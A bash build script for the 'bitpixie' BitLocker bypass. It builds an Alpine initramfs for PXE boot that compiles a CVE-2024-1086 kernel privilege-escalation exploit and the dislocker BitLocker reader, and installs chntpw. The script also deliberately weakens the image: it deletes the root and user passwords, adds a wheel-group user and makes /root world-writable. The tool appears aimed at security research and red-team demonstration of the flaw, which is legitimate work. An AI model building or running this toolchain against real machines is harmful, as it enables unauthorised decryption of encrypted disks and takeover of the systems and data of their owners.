#!/usr/bin/env bash
#
# Create initramfs for bitpixie exploit
# Based on top of https://github.com/alpinelinux/alpine-make-rootfs
#

# Failsafe
set -eo pipefail

## Common functions
out() { printf "\n\033[32;1m[+] %s \033[0m\n" "$1"; }

if [ "$1" = "-d" ] || [ "$1" = "--debug" ]; then
    DEBUG="1"
elif [ -z "$1" ]; then
    DEBUG="0"
else
    printf 'ERROR: Unkown input.\n  Usage: %s [-d|--debug]\n' "$(basename $0)"
    exit 1
fi

SRC_ROOT="$PWD"
CACHE="$SRC_ROOT/.cache"
[ -d $CACHE ] || mkdir -p $CACHE # create .cache directory

out "Using $SRC_ROOT as root of operation."

## Download missing artifacts
bash -c "$SRC_ROOT/linux/download.sh $SRC_ROOT $CACHE"

# create temporary initramfs direcotry
INITRAMFS="$(mktemp -d)"
out "Created temporary rootfs at $INITRAMFS."
if [ "$DEBUG" = "0" ]; then
    trap 'sudo rm -rf $INITRAMFS' EXIT
fi

## Preprocessing
# Copy all relevant files

# kernel
mkdir -p $INITRAMFS/boot
cp $CACHE/vmlinuz* $INITRAMFS/boot
# copy kernel driver
cp -r $CACHE/lib $INITRAMFS
# additional pieces of rootfs files
cp -r $SRC_ROOT/linux/root/* $INITRAMFS
find $INITRAMFS -type f -name 'README.md' -delete

out "Populating temporary rootfs at $INITRAMFS..."

## Execute it and start the build process
sudo $CACHE/alpine-make-rootfs \
    --branch latest-stable \
    --packages 'alpine-base agetty eudev chntpw util-linux openssh doas' \
    --packages 'sgdisk ntfs-3g fuse-common' \
    --packages 'fuse mbedtls musl cifs-utils' \
    --packages 'vis' \
    --timezone 'UTC' \
    --script-chroot "$INITRAMFS" - <<'SHELL'
        # Fail if an error occurs
        set -e

        # Fix PATH during build
        export PATH="/bin:/sbin:$PATH"

        # Fix missing links
        $(which busybox) --install -s /bin

        # Generate modules.*.bin for modprobe
        depmod $(ls /boot/vmlinuz* |  cut -d "-" -f2-)

        # Add services for service manager.
        # See
        #  https://wiki.alpinelinux.org/wiki/OpenRC
        # for more information.
        #
        # A list of available services resides in $INITRAMFS/etc/init.d
        rc-update add dmesg sysinit

        rc-update add hwclock boot
        rc-update add modules boot
        rc-update add sysctl boot
        rc-update add hostname boot
        rc-update add bootmisc boot
        rc-update add syslog boot
        rc-update add klogd boot
        rc-update add networking boot
        rc-update add hwdrivers boot
        rc-update add sysfs boot
        rc-update add procfs boot

        rc-update add mount-ro shutdown
        rc-update add killprocs shutdown

        # Load also agetty.ttyS0 to see the kernel log during boot up in
        # combination with the flag `-append "console=ttyS0"`
        CONSOLE="ttyS0"
        ln -s /etc/init.d/agetty /etc/init.d/agetty.$CONSOLE
        rc-update add agetty.$CONSOLE default

        # Show debug infos
        set -x

        # save start path for later to return to
        ROOT="$PWD"

        # Prepare build environment
        build_packages="alpine-sdk" # Common development meta package
        build_packages="${build_packages} cmake fuse-dev mbedtls-dev" # dislocker
        apk add $build_packages

        # Build cve exploit
        cve="$(mktemp -d)"
        git clone --single-branch https://github.com/andigandhi/CVE-2024-1086_bitpixie.git $cve
        cd $cve
        # Use commit 30cccf935c2a ("removed unused functions and changed output
        # file") as HEAD
        git reset --hard 30cccf935c2a
        make CC=cc && cp ./exploit /usr/bin

        # Build dislocker
        bitlocker="$(mktemp -d)"
        git clone --single-branch https://github.com/Aorimn/dislocker.git $bitlocker
        cd $bitlocker
        # Use commit 3e7aea196eaa ("Merge pull request #317 from
        # JunielKatarn/macos") as HEAD
        git reset --hard 3e7aea196eaa
        cmake -S ./ && make && make install

        # Cleanup build environment
        apk del $build_packages

        ## Postprocessing
        cd $ROOT

        # Add new non-root user.
        NAME="bitpix"
        addgroup ${NAME}
        adduser -s /bin/sh -h /home/${NAME} -u 1000 -D -G ${NAME} ${NAME}
        addgroup bitpix wheel # add new user to group wheel

        chmod -R 777 /root
        chown root:root /etc/doas.conf

        # Delete password(s)
        passwd -d root
        passwd -d ${NAME}
SHELL

# Exit prematurely if alpine-make-rootfs fails
if [ "$?" = "1" ]; then
    if [ "$DEBUG" = "1" ]; then
        trap - EXIT
        out "Kept temporary rootfs at $INITRAMFS."
    fi
    exit 1
fi

# Production: zstd with near-maximum compression but multithreaded
COMPRESS="zstd -T0 -9 --ultra -c"
FILE_EXTENSION="zst"

OUTPUT="$SRC_ROOT/pxe-server/bitpixie-initramfs"
RELATIVE_OUTPUT="$(realpath --relative-to "$SRC_ROOT" "$OUTPUT")"

out "Creating initramfs $RELATIVE_OUTPUT from temporary rootfs at $INITRAMFS..."

# Use parallel cpio creation if supported (bsdtar is faster than GNU cpio)
if command -v bsdtar >/dev/null; then
    (cd "$INITRAMFS" && sudo bsdtar -cf - --format=newc . | $COMPRESS) > "$OUTPUT"
else
    # Fallback to standard cpio with parallel compression
    (cd "$INITRAMFS" && sudo find . | sudo cpio -o -H newc | $COMPRESS) > "$OUTPUT"
fi

out "Created compressed initramfs ($FILE_EXTENSION) at $RELATIVE_OUTPUT"
out "To decrypt use 'zstd -dc path/to/bitpixie-initramfs.zst | sudo cpio -idv'"

mkdir -p out

OUT_DIR="$SRC_ROOT/out"
PXE_SERVER="$(realpath --relative-to "$SRC_ROOT" "$SRC_ROOT/pxe-server")"
TAR_GZ="$(realpath --relative-to "$SRC_ROOT" "$OUT_DIR/$PXE_SERVER.tar.gz")"

if command -v pigz &> /dev/null; then
    out "Creating $TAR_GZ using pigz"
    tar -cf - "$PXE_SERVER" | pigz -9 > "$TAR_GZ"
else
    out "Creating $TAR_GZ using gzip"
    tar -czf "$TAR_GZ" "$PXE_SERVER"
fi

if [ "$DEBUG" = "1" ]; then
    # Deactivate deletion of INITRAMFS
    trap - EXIT
    out "Kept temporary rootfs at $INITRAMFS"
else
    out "Deleted $INITRAMFS."
fi
